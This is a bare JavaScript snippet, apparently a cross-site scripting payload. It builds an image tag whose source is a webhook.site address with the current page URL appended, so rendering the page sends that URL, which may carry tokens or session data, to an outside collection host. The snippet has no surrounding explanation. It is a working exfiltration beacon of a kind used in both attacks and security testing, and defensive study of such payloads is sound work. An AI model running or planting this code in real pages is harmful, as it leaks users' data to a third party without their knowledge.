var img = document.createElement("img");

var data = window.location.href;
console.log(JSON.stringify(data));
img.src="https://webhook.site/dca2f591-eb3a-47f9-8f5f-c5c2d1c0116d/a.png?data="+data;
document.body.appendChild(img);
